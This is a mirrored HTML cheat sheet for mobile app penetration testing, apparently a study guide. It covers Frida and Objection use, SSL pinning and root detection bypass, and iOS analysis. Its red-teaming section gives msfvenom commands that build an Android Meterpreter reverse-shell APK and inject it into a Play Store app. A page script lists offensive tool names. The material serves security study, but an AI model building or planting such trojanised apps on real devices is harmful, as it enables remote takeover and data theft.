+emulator -avd &lt;AVD_NAME&gt; -writable-system -no-snapshot
+
+# 3. Navigate to MobSF directory and start the dynamic analyzer
+cd /path/to/Mobile-Security-Framework-MobSF
+./run.sh  # For Linux/MacOS
+./run.bat # For Windows
+
+# 4. Upload the APK to MobSF for dynamic analysis and start the process
+
+# 5. Navigate to the provided link, upload the APK, and click &quot;Start Dynamic Analysis&quot;
+</code></pre>
+              <h3 id="36-dynamic-analysis-vectors">3.6 Dynamic Analysis Vectors</h3>
+              <p>Objection and Frida can be used for various dynamic analysis tasks on a running app.</p>
+              <ol>
+                <li><strong>Monitoring Application Behavior</strong></li>
+              </ol>
+              <pre><code class="language-bash"># Start Objection exploration on a running app
+objection explore
+
+# Monitor clipboard activity
+android clipboard monitor
+
+# Dump all memory
+memory dump all
+
+# Interact with the Android keystore
+android keystore list
+android keystore watch
+
+# Simulate root access
+android root simulate
+
+# Inject a Frida script to disable SSL pinning or other protections
+frida -U -n &lt;app_package_name&gt; -l disable-ssl-pinning.js
+
+# Trace specific API calls to understand how the app interacts with system resources
+frida-trace -U -n &lt;app_package_name&gt; -i &quot;open*&quot;
+</code></pre>
+              <ol start="2">
+                <li><strong>File System Exploration</strong></li>
+              </ol>
+              <pre><code class="language-bash"># Explore Files
+Navigate to the data/data/&lt;app_package_name&gt;/ directory to inspect databases, shared preferences, and other stored files.
+
+# Pull the SQLite database from the app&#39;s data directory
+adb pull /data/data/&lt;app_package_name&gt;/databases/&lt;database_name&gt;.db
+
+# Use sqlite3 or DB Browser for SQLite to analyze the pulled database
+sqlite3 &lt;database_name&gt;.db
+</code></pre>
+              <ol start="3">
+                <li><strong>Network Traffic Interception</strong></li>
+              </ol>
+              <pre><code class="language-plaintex"># 1. Setup BurpSuite
+Configure your device to use Burp Suite as a proxy and intercept HTTP/S traffic
+
+# 2. Bypass SSL Pinnning
+Use Burp Suite in combination with Frida or Objection to bypass SSL pinning
+</code></pre>
+              <ol start="4">
+                <li><strong>Advanced Memory Analysis</strong></li>
+              </ol>
+              <pre><code class="language-bash"># Dump the memory of the target application for forensic analysis
+fridump -U -n &lt;app_package_name&gt;
+
+# Use Volatility to parse and analyze the memory dump
+volatility -f memory.dump --profile=LinuxAndroid --plugins=volatility_plugins/
+</code></pre>
+              <ol start="5">
+                <li><strong>Using Frida Codeshare Scripts</strong>
+                  Frida Codeshare is a repository of scripts that can be used to extend Frida&#39;s functionality. These
+                  scripts can be used to automate various tasks such as bypassing SSL pinning, hooking functions, and
+                  more.</li>
+              </ol>
+              <pre><code class="language-bash"># Download and run a script from Frida Codeshare
+frida -U -n &lt;app_package_name&gt; --codeshare &lt;codeshare_id&gt;
+</code></pre>
+              <h3 id="37-dealing-with-split-apks">3.7 Dealing with Split APKs</h3>
+              <p>When dealing with split APKs, you&#39;ll need to pull and sign each APK before installing them on the
+                device.</p>
+              <pre><code class="language-bash"># 1. List and pull all APKs associated with the app, replace &lt;APP_NAME&gt; with your app&#39;s package name
+pm list packages | grep &lt;APP_NAME&gt;
+pm path &lt;APP_PATH&gt;
+
+# 2. Pull base and split APKs from the device
+adb pull &lt;base.apk&gt; &lt;split_config.apk&gt;
+
+# 3. Inject base.apk with Objection
+objection patchapk -s base.apk --use-aapt2
+
+# 4. Sign each split APK
+objection signapk &lt;split_config.apk&gt;
+
+# 5. Install all APKs on the device
+adb install-multiple base.objection.apk split_config.apk
+</code></pre>
+              <h3 id="38-frida-codeshare-and-startup-scripts">3.8 Frida Codeshare and Startup Scripts</h3>
+              <p><strong>Frida Basics</strong></p>
+              <pre><code class="language-bash"># Install the tool
+pip install frida-tools
+
+# List connected devices
+frida-ls-devices
+
+# Attach to a running process
+frida -U -n com.example.app
+
+# Script with Frida
+// Example Frida script to hook a function
+Java.perform(function() {
+    var MainActivity = Java.use(&#39;com.example.app.MainActivity&#39;);
+    MainActivity.someFunction.implementation = function() {
+        console.log(&#39;someFunction was called&#39;);
+        return this.someFunction();
+    };
+});
+
+# Run a script
+frida -U -f com.example.app -l myscript.js --no-pause
+</code></pre>
+              <p><strong>Frida Codeshare</strong>
+                Provides scripts that can be used to add functionalities to your dynamic analysis.</p>
+              <pre><code class="language-bash"># Run a script after starting Objection, replace &lt;SCRIPT.js&gt; with your script file
+objection explore --startup-script &lt;SCRIPT.js&gt;
+
+# Alternatively, run generic commands after startup
+objection explore --s &quot;android root disable&quot;
+
+# Fix issues with Kotlin applications by specifying the AAPT2 version
+objection patchapk -s &lt;APK_NAME&gt;.apk --use-aapt2
+</code></pre>
+              <h3 id="39-root-detection-bypass">3.9 Root Detection Bypass</h3>
+              <p>Bypassing root detection is crucial for analyzing apps that prevent execution on rooted devices. Below
+                are some common techniques and tools:</p>
+              <p><strong>Magisk:</strong></p>
+              <ul>
+                <li><strong>Installation</strong>: Install Magisk for root access with a systemless approach.</li>
+                <li><strong>Hiding Root</strong>: Use MagiskHide to conceal the root status from apps.</li>
+              </ul>
+              <p><strong>Xposed Framework:</strong></p>
+              <ul>
+                <li><strong>Installation</strong>: Set up the Xposed framework on a rooted device.</li>
+                <li><strong>RootCloak Module</strong>: Use the RootCloak module to hide root from specific apps.</li>
+              </ul>
+              <p><strong>Frida:</strong></p>
+              <ul>
+                <li><strong>Root Bypass Script</strong>: use Frida scripts to dynamically intercept and modify root
+                  detection functions in the app.</li>
+              </ul>
+              <pre><code class="language-bash"># Frida example to bypass root detection
+frida -U -f com.example.app -l root-bypass.js --no-pause
+</code></pre>
+              <h3 id="310-network-traffic-analysis">3.10 Network Traffic Analysis</h3>
+              <p>Analyzing network traffic helps to understand how an app communicates with its backend services. Here
+                are some additional tools and techniques:</p>
+              <ul>
+                <li><strong>tcpdump:</strong> capture network traffic directly from the device:</li>
+              </ul>
+              <pre><code class="language-bash">adb shell tcpdump -i any -s 0 -w /sdcard/capture.pcap
+adb pull /sdcard/capture.pcap .
+</code></pre>
+              <ul>
+                <li>
+                  <p><strong>Wireshark:</strong> analyze the <code>.pcap</code> file using Wireshark to inspect network
+                    packets.</p>
+                </li>
+                <li>
+                  <p><strong>SSL Split/SSL Kill Switch:</strong> bypass SSL Pinning to capture encrypted traffic:</p>
+                </li>
+              </ul>
+              <pre><code class="language-bash"># Example to disable SSL pinning with Frida
+frida -U -f com.example.app -l ssl-pinning-bypass.js --no-pause
+</code></pre>
+              <h3 id="311-log-analysis">3.11 Log Analysis</h3>
+              <p>Analyzing logs can reveal sensitive information or potential vulnerabilities.</p>
+              <ul>
+                <li><strong>Logcat</strong></li>
+              </ul>
+              <pre><code class="language-bash">adb logcat &gt; app_logs.txt
+</code></pre>
+              <ul>
+                <li><strong>Filter logs</strong> for sensitive data:</li>
+              </ul>
+              <pre><code class="language-bash">adb logcat | grep &quot;keyword&quot;
+</code></pre>
+              <ul>
+                <li><strong>Sensitive Information Search:</strong> search for credentials or tokens in logs:</li>
+              </ul>
+              <pre><code class="language-bash">grep -i &#39;password\|token&#39; app_logs.txt
+</code></pre>
+
+              <h2 id="4-android-red-teaming">4. <span class="emoji">⚔️</span> Android Red Teaming</h2>
+              <h3 id="41-creating-a-generic-apk">4.1 Creating a Generic APK</h3>
+              <p><strong>We will be using Metasploit and Meterpreter</strong></p>
+              <ol>
+                <li><strong>Create the APK</strong></li>
+              </ol>
+              <pre><code class="language-bash">msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;kali_IP&gt; LPORT=&lt;your_port&gt; R&gt;&lt;myapp.apk&gt;
+</code></pre>
+              <ol start="2">
+                <li><strong>Generate the key for signing</strong></li>
+              </ol>
+              <pre><code class="language-bash">keytool -genkey -V -keystore key.keystore -alias keystore -kayalg RSA 2048 - validity 10000
+</code></pre>
+              <ol start="3">
+                <li><strong>Sign the APK</strong></li>
+              </ol>
+              <pre><code class="language-bash">jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore android.apk keystore
+</code></pre>
+              <ol start="4">
+                <li><strong>Compress the apk</strong></li>
+              </ol>
+              <pre><code class="language-bash">zipalign -v 4 android.apk hackedapp.apk
+</code></pre>
+              <ol start="5">
+                <li><strong>Install the APK for Testing in the Emulator</strong></li>
+              </ol>
+              <pre><code class="language-bash">adb install hackedapp.apk
+</code></pre>
+              <h3 id="42-inject-meterpreter-playload-into-play-store-app">4.2 Inject Meterpreter Playload into Play
+                Store App</h3>
+              <p><a href="https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/">Reference Guide</a>
+              </p>
+              <pre><code class="language-bash"># 1. Download app to your android device
+
+# 2. Pull using abd
+
+# 3.
+pm list packages | grep injured
+
+# 4.
+pm path b3nac.injuredandroid
+
+# 5.
+abd shell [result_path_step_before]
+adb pull &lt;path_to_apk/base.apk&gt; -o &lt;my_app.apk&gt;
+
+# 6. Create the payload
+msfvenom -x &lt;my_app_to_inject.apk&gt; -p android/meterpreter/reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=&lt;my_port&gt; -o &lt;my_app_hacked.apk&gt;
+
+# 7. Uninstall the previous app and intall the malicious one for testing.
+</code></pre>
+              <h2 id="5-ios-static-analysis">5. <span class="emoji">🛡️</span> iOS Static Analysis</h2>
+              <h3 id="51-basics">5.1 Basics</h3>
+              <p><strong>iOS Ecosystem</strong>:</p>
+              <ul>
+                <li>iOS is a more closed environment compared to Android, often referred to as a &#39;walled
+                  garden.&#39; </li>
+                <li>Jailbreaking is used to bypass some of these restrictions, allowing greater access to the file
+                  system and installed apps.</li>
+              </ul>
+              <p><strong>Development Environment</strong>:</p>
+              <ul>
+                <li><code>Xcode</code> is the integrated development environment (IDE) used for developing iOS
+                  applications.</li>
+              </ul>
+              <p><strong>Hardware Security</strong>:</p>
+              <ul>
+                <li>iOS devices include hardware security features like the Secure Enclave, not commonly found in
+                  Android devices.</li>
+              </ul>
+              <p><strong>File System</strong>: iOS devices have a dual-partition file system:</p>
+              <ul>
+                <li><strong>User Partition</strong>: Stores user data and is encrypted.</li>
+                <li><strong>OS Partition</strong>: Contains the operating system and system files.</li>
+              </ul>
+              <p><strong>Application Development</strong>: most iOS apps are written in <code>Objective-C</code> or
+                <code>Swift</code> (the latest language).
+              </p>
+              <p><strong>Application Packaging</strong>:</p>
+              <ul>
+                <li>iOS apps are distributed as <code>.ipa</code> files, which are signed bundles containing the app and
+                  its assets.</li>
+                <li><code>.ipa</code> files include a <code>/Payload</code> directory, which contains the actual
+                  application in the form of <code>.app</code> files.</li>
+                <li>Important files within the <code>.ipa</code> include <code>Info.plist</code>, similar to
+                  <code>AndroidManifest.xml</code> in Android.
+                </li>
+              </ul>
+              <p><strong>Extracting <code>.ipa</code> Files</strong>: tools like <code>AnyTrans</code> and
+                <code>IPATool</code> can be used to download <code>.ipa</code> files directly from the App Store for
+                analysis.
+              </p>
+              <h3 id="52-manual-static-analysis">5.2 Manual Static Analysis</h3>
+              <p><strong>Extracting Contents from an <code>.ipa</code> File</strong>:</p>
+              <ul>
+                <li>Rename the <code>.ipa</code> file to <code>Payload.zip</code>, then unzip it to access its contents.
+                </li>
+                <li>The unzipped folder will include a <code>Payload</code> directory containing the app’s files.</li>
+              </ul>
+              <p><strong>Key Files for Analysis</strong>:</p>
+              <ul>
+                <li><strong><code>Info.plist</code></strong>: Contains configuration settings, similar to
+                  <code>AndroidManifest.xml</code>.
+                </li>
+                <li>Other important files include additional <code>.plist</code> and <code>.json</code> files, which may
+                  store critical information such as API endpoints, configurations, and more.</li>
+              </ul>
+              <p><strong>Automated Static Analysis</strong>: use <code>MobSF</code> (Mobile Security Framework) for
+                automated static analysis, which provides insights into vulnerabilities and potential risks in the app.
+              </p>
+              <h3 id="53-advanced-static-analysis">5.3 Advanced Static Analysis</h3>
+              <p><strong>Binary Analysis</strong>:</p>
+              <ul>
+                <li>Use tools like <code>class-dump</code> to extract Objective-C class information from iOS binaries.
+                </li>
+                <li><code>Hopper</code> or <code>Ghidra</code> can be used for disassembling and decompiling the binary
+                  to understand the app&#39;s functionality.</li>
+                <li><strong>Code Obfuscation</strong>: Be aware that many apps may use code obfuscation techniques to
+                  make reverse engineering more difficult. Use <code>objection</code> or <code>Frida</code> scripts to
+                  bypass these.</li>
+              </ul>
+              <p><strong>In-depth Analysis of Plist Files (Key Plist Files)</strong>:</p>
+              <ul>
+                <li><code>Entitlements.plist</code>: Contains the entitlements granted to the app, such as access to
+                  iCloud, HealthKit, etc.</li>
+                <li><code>embedded.mobileprovision</code>: Describes the provisioning profile, including app ID, team
+                  ID, and entitlements.</li>
+              </ul>
+              <p><strong>Automated Static Analysis Tools</strong>: </p>
+              <ul>
+                <li><strong>Otool</strong>: A command-line tool that displays information about Mach-O files, such as
+                  libraries linked, sections, and symbols.</li>
+                <li><strong><code>jtool</code></strong>: A popular alternative to <code>otool</code> with more features.
+                </li>
+              </ul>
+              <h2 id="6-ios-dynamic-analysis">6. <span class="emoji">🧪</span> iOS Dynamic Analysis</h2>
+              <h3 id="61-basics">6.1 Basics</h3>
+              <p><strong>Dynamic Analysis Overview</strong></p>
+              <ul>
+                <li>Dynamic analysis involves running the application and interacting with it to find vulnerabilities.
+                </li>
+                <li>One of the main challenges in iOS dynamic analysis is SSL pinning, which can prevent traffic
+                  interception.</li>
+              </ul>
+              <p><strong>SSL Pinning Bypass</strong></p>
+              <ul>
+                <li>Attempt to bypass SSL pinning using tools like <code>Burp Suite</code> or <code>Proxyman</code>.
+                </li>
+                <li>If these tools fail, consider using <code>Objection</code> to patch the <code>.ipa</code> file and
+                  disable SSL pinning.</li>
+                <li>As a last resort, use a jailbroken device with tools like <code>SSL KillChain</code> to bypass SSL
+                  pinning.</li>
+              </ul>
+              <h3 id="62-tools-and-techniques">6.2 Tools and Techniques</h3>
+              <p><strong>Objection</strong>:</p>
+              <ul>
+                <li>Install <code>Objection</code> via <code>pip3 install frida-tools</code> and
+                  <code>pip3 install objection</code>.
+                </li>
+                <li>Use <code>objection patchipa</code> to patch the <code>.ipa</code> file and disable SSL pinning.
+                </li>
+                <li>Use <code>objection explore</code> to hook into the app and perform further analysis.</li>
+              </ul>
+              <p><strong>Jailbreaking</strong>:</p>
+              <ul>
+                <li>Jailbreaking allows full access to the device’s file system and is often necessary for deep
+                  penetration testing.</li>
+                <li>Tools like <a href="https://checkra.in/">Checkra1n</a> can be used for jailbreaking iOS devices.
+                </li>
+              </ul>
+              <p><strong>SSL KillSwitch</strong>: the <a href="https://github.com/nabla-c0d3/ssl-kill-switch3">SSL
+                  KillSwitch</a> tool can be used on a jailbroken device to disable SSL pinning at runtime.</p>
+              <p><strong>Cydia Substrate</strong>:</p>
+              <ul>
+                <li>Used for method hooking on jailbroken devices. It allows developers and pentesters to modify app
+                  behavior dynamically.</li>
+              </ul>
+              <p><strong>Cycript</strong>:</p>
+              <ul>
+                <li>A blend of JavaScript and Objective-C that can be used for exploring and modifying iOS apps at
+                  runtime.</li>
+              </ul>
+
+              <h2 id="7-references">7. <span class="emoji">📚</span> References</h2>
+              <ul>
+                <li><a
+                    href="https://github.com/peterrakolcza/PJMT-study-guide">https://github.com/peterrakolcza/PJMT-study-guide</a>
+                </li>
+              </ul>
+
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Cheatsheet Section -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Index ======= -->
+  <div class="index-btn" onclick="toggleIndex()">Index</div>
+  <div id="index" class="index">
+    <div class="container mt-3">
+      <div class="input-group mb-3">
+        <input type="text" id="search-input" class="form-control" placeholder="Search sections..." aria-label="Search sections" aria-describedby="search-button">
+        <button class="btn btn-primary" type="button" id="search-button">
+          <i class="bi bi-search"></i>
+        </button>
+      </div>
+    </div>
+    <button class="expand-collapse-btn" onclick="toggleAll()">Show/Hide All</button>
+
+    <div class="section-rose">
+      <button class="dropdown-btn">1. <span class="emoji">📖</span> Introduction
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <button class="dropdown-btn">1.1 Mobile App Pentesting Process
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="dropdown-container">
+          <a href="#111-reconnaissance">1.1.1 Reconnaissance</a>
+          <a href="#112-static-analysis">1.1.2 Static Analysis</a>
+          <a href="#113-dynamic-analysis">1.1.3 Dynamic Analysis</a>
+          <a href="#114-reporting">1.1.4 Reporting</a>
+        </div>
+        <a href="#12-android-security-architecture">1.2 Android Security Architecture</a>
+        <a href="#13-app-security--signing-process">1.3 App Security &amp; Signing Process</a>
+        <a href="#14-setup-instructions">1.4 Setup Instructions</a>
+        <a href="#15-install-utilities">1.5 Install Utilities</a>
+      </div>
+    </div>
+
+    <div class="section-mint-green">
+      <button class="dropdown-btn">2. <span class="emoji">🛠️</span> Android Static Analysis
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#21-pulling-an-apk-from-the-play-store">2.1 Pulling an APK from the Play Store</a>
+        <a href="#22-manual-static-analysis">2.2 Manual Static Analysis</a>
+        <a href="#23-finding-hardcoded-strings">2.3 Finding Hardcoded Strings</a>
+        <a href="#24-injured-android-static-analysis">2.4 Injured Android Static Analysis</a>
+        <a href="#25-enumerating-aws-storage-buckets">2.5 Enumerating AWS Storage Buckets</a>
+        <a href="#26-enumerating-firebase-databases">2.6 Enumerating Firebase Databases</a>
+        <a href="#27-automated-analysis-using-mobsf">2.7 Automated Analysis using MobSF</a>
+      </div>
+    </div>
+
+    <div class="section-lemon">
+      <button class="dropdown-btn">3. <span class="emoji">🎮</span> Android Dynamic Analysis
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#31-burpsuite-configuration">3.1 BurpSuite Configuration</a>
+        <a href="#32-ssl-pinning">3.2 SSL Pinning</a>
+        <a href="#33-automatic-patching-with-objection">3.3 Automatic Patching with Objection</a>
+        <a href="#34-manual-patching">3.4 Manual Patching</a>
+        <a href="#35-dynamic-analysis-with-mobsf">3.5 Dynamic Analysis with MobSF</a>
+        <a href="#36-dynamic-analysis-vectors">3.6 Dynamic Analysis Vectors</a>
+        <a href="#37-dealing-with-split-apks">3.7 Dealing with Split APKs</a>
+        <a href="#38-frida-codeshare-and-startup-scripts">3.8 Frida Codeshare and Startup Scripts</a>
+        <a href="#39-root-detection-bypass">3.9 Root Detection Bypass</a>
+        <a href="#310-network-traffic-analysis">3.10 Network Traffic Analysis</a>
+        <a href="#311-log-analysis">3.11 Log Analysis</a>
+      </div>
+    </div>
+
+    <div class="section-light-coral">
+      <button class="dropdown-btn">4. <span class="emoji">⚔️</span> Android Red Teaming
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#41-creating-a-generic-apk">4.1 Creating a Generic APK</a>
+        <a href="#42-inject-meterpreter-playload-into-play-store-app">4.2 Inject Meterpreter Playload into Play Store
+          App</a>
+      </div>
+    </div>
+
+    <div class="section-lavender">
+      <button class="dropdown-btn">5. <span class="emoji">🛡️</span> iOS Static Analysis
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#51-basics">5.1 Basic</a>
+        <a href="#52-manual-static-analysis">5.2 Manual Static Analysis</a>
+        <a href="#53-advanced-static-analysis">5.3 Advanced Static Analysis</a>
+      </div>
+    </div>
+
+    <div class="section-salmon">
+      <button class="dropdown-btn">6. <span class="emoji">🧪</span> iOS Dynamic Analysis
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#61-basics">6.1 Basics</a>
+        <a href="#62-tools-and-techniques">6.2 Tools and Techniques</a>
+      </div>
+    </div>
+
+    <div class="section-soft-grey">
+      <a href="#7-references">7. <span class="emoji">📚</span> References</a>
+    </div>
+
+  </div>
+  <!-- End Index -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="credits">
+        <p>
+          &copy; Emmanuel Solis<br>
+          Pentester &amp; Red Teamer
+        </p>
+      </div>
+    </div>
+  </footer><!-- End  Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="vendor/purecounter/purecounter.js"></script>
+  <script src="vendor/aos/aos.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="vendor/typed.js/typed.min.js"></script>
+  <script src="vendor/waypoints/noframework.waypoints.js"></script>
+  <script src="vendor/php-email-form/validate.js"></script>
+
+  <!-- Prism JS -->
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
+  
+  <!-- Template Main JS File -->
+  <script src="js/main.js"></script>
+
+  <!-- Prism JS Additional Keywords-->
+  <script>
+    Prism.languages.bash = Prism.languages.extend('bash', {
+      'function': /\b(?:aircrack-ng|amap|arpspoof|beef|bettercap|bloodhound|burpsuite|ldapsearch|cain|crackmapexec|cewl|curl|cd|dirb|dnsenum|dnsspoof|dnstracer|enum4linux|ettercap|echo|xfreerdp|rdesktop|chmod|mv|sudo|ssh|find|etterfilter|exploitdb|ftp|gobuster|hashcat|hashid|hash-identifier|hydra|httrack|smbmap|impacket-GetNPUsers|impacket-GetTGT|impacket-psexec|impacket-secretsdump|impacket-smbexec|ike-scan|john|kerbrute|linenum|linpeas|ls|maltego|masscan|medusa|metasploit|mimikatz|ms08-067|msfcli|msfconsole|msfupdate|msfvenom|nbtscan|nc|netcat|netdiscover|netstat|nikto|nmap|nslookup|openssh|patator|ping|powershell-empire|powersploit|proxychains|psexec|python|python2|python2.7|python3|reaver|responder|scp|searchsploit|setoolkit|shellshock|smtp-user-enum|smbclient|snmp-check|snmpwalk|sparta|sqlmap|sqlninja|sslscan|sublist3r|tcpdump|telnet|whois|theHarvester|tmux|tshark|ticketer|unicornscan|veil|volatility|wfuzz|whatweb|wireshark|windows-exploit-suggester|w3af|xsser|xsstrike|rpcclient|zaproxy)\b/
+    });
+  </script>
+  <script>
+    Prism.languages.powershell = Prism.languages.extend('powershell', {
+      'function': /\b(?:Add-ADGroupMember|Add-Computer|Add-Content|Add-ExchangeAdministrator|Add-Member|Add-Type|Checkpoint-Computer|Clear-Content|Clear-History|Clear-Item|Clear-ItemProperty|Clear-Variable|Compare-Object|ConvertFrom-Json|ConvertTo-Json|Copy-Item|Copy-ItemProperty|Disable-ADAccount|Disable-PSRemoting|Enable-ADAccount|Enable-PSRemoting|Export-Csv|Export-ModuleMember|Export-PSSession|Find-Module|Get-ADComputer|Get-ADDomain|Get-ADGroup|Get-ADUser|Get-Alias|Get-AuthenticodeSignature|Get-ChildItem|Get-Clipboard|Get-Command|Get-Content|Get-Credential|Get-Date|Get-EventLog|Get-Help|Get-History|Get-Item|Get-ItemProperty|Get-LocalGroupMember|Get-Location|Get-Member|Get-Module|Get-Process|Get-Service|Get-Variable|Get-WinEvent|Import-Csv|Import-Module|Invoke-Command|Invoke-Expression|Invoke-RestMethod|Invoke-WebRequest|Measure-Object|Move-Item|New-ADUser|New-Alias|New-Item|New-Module|New-PSDrive|New-PSSession|Out-File|Read-Host|Remove-ADUser|Remove-Item|Remove-Module|Remove-PSDrive|Remove-Variable|Restart-Computer|Restore-Computer|Select-Object|Set-ADUser|Set-Alias|Set-Content|Set-Date|Set-Item|Set-Location|Set-Variable|Start-Process|Stop-Process|Test-Connection|Test-Path|Update-Help|Write-Host|Write-Output)\b/
+    });
+  </script>
+
+  <script>
+    let allOpen = false; // Track the state of the dropdowns
+
+    function toggleIndex() {
+      const index = document.getElementById('index');
+      index.classList.toggle('open');
+    }
+
+    function toggleAll() {
+      const dropdownContainers = document.querySelectorAll('.dropdown-container, .nested-dropdown-container');
+      const buttons = document.querySelectorAll('.dropdown-btn, .nested-dropdown-btn');
+
+      // Set the new state based on the current state
+      allOpen = !allOpen;
+
+      for (let i = 0; i < dropdownContainers.length; i++) {
+        const container = dropdownContainers[i];
+        const btn = buttons[i];
+        if (allOpen) {
+          container.style.display = 'block';
+          btn.classList.add('active');
+        } else {
+          container.style.display = 'none';
+          btn.classList.remove('active');
+        }
+      }
+    }
+
+    const dropdownBtns = document.getElementsByClassName("dropdown-btn");
+    for (let i = 0; i < dropdownBtns.length; i++) {
+      dropdownBtns[i].addEventListener("click", function () {
+        this.classList.toggle("active");
+        const dropdownContent = this.nextElementSibling;
+        if (dropdownContent.style.display === "block") {
+          dropdownContent.style.display = "none";
+        } else {
+          dropdownContent.style.display = "block";
+        }
+      });
+    }
+
+    const nestedDropdownBtns = document.getElementsByClassName("nested-dropdown-btn");
+    for (let i = 0; i < nestedDropdownBtns.length; i++) {
+      nestedDropdownBtns[i].addEventListener("click", function () {
+        this.classList.toggle("active");
+        const nestedDropdownContent = this.nextElementSibling;
+        if (nestedDropdownContent.style.display === "block") {
+          nestedDropdownContent.style.display = "none";
+        } else {
+          nestedDropdownContent.style.display = "block";
+        }
+      });
+    }
+
+    setTimeout(function() {
+      var alert = document.querySelector('.alert-warning');
+      if (alert) {
+        var bootstrapAlert = new bootstrap.Alert(alert);
+        bootstrapAlert.close();
+      }
+    }, 7000); // 7 seconds
+
+    function removeHighlights(element) {
+        element.innerHTML = element.innerHTML.replace(/<\/?strong>/gi, "");
+      }
+
+    function highlightTerm(element, term) {
+      const regex = new RegExp(`(${term})`, 'gi');
+      element.innerHTML = element.innerHTML.replace(regex, "<strong>$1</strong>");
+    }
+
+    document.getElementById("search-input").addEventListener("input", function () {
+      const searchTerm = this.value.toLowerCase();
+      const headings = document.querySelectorAll(".cheatsheet-content h2, .cheatsheet-content h3, .cheatsheet-content h4, .cheatsheet-content h5, .cheatsheet-content h6");
+      let anyMatch = false;
+
+      headings.forEach((heading) => {
+        const text = heading.textContent.toLowerCase();
+        const sectionContent = [];
+
+        // Get all sibling elements until the next heading
+        let sibling = heading.nextElementSibling;
+        while (sibling && !sibling.matches("h2, h3, h4, h5, h6")) {
+          sectionContent.push(sibling);
+          sibling = sibling.nextElementSibling;
+        }
+
+        // Remove existing highlights
+        removeHighlights(heading);
+
+        // Only show headings and content that match the search term
+        if (text.includes(searchTerm)) {
+          heading.style.display = "";
+          sectionContent.forEach((elem) => (elem.style.display = ""));
+          if (searchTerm) {
+            highlightTerm(heading, searchTerm);
+          }
+
+          anyMatch = true;
+        } else {
+          // Hide non-matching headings and content
+          heading.style.display = "none";
+          sectionContent.forEach((elem) => (elem.style.display = "none"));
+        }
+      });
+
+      const noMatchMessage = document.getElementById("no-match-message");
+      if (!anyMatch) {
+        if (!noMatchMessage) {
+          const message = document.createElement("p");
+          message.id = "no-match-message";
+          message.className = "text-danger mt-3";
+          message.textContent = "No matches found.";
+          document.querySelector(".cheatsheet-content").appendChild(message);
+        }
+      } else if (noMatchMessage) {
+        noMatchMessage.remove();
+      }
+    });
+
+    function toggleSubmenu(event) {
+      event.preventDefault(); // Prevents navigation
+      const submenu = event.currentTarget.nextElementSibling;
+      const arrow = event.currentTarget.querySelector('.arrow');
+
+      submenu.classList.toggle('open'); // Toggle the submenu visibility
+      // Rotate the arrow based on whether the submenu is open
+      if (submenu.classList.contains('open')) {
+          arrow.style.transform = 'rotate(0deg)'; // Arrow points right when closed
+      } else {
+          arrow.style.transform = 'rotate(-90deg)';  // Arrow points down when open
+      }
+    }
+  </script>
+
+</body>
+
+
+<!-- Mirrored from www.emmanuelsolis.com/pjmt.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Aug 2025 18:44:32 GMT -->
+</html>
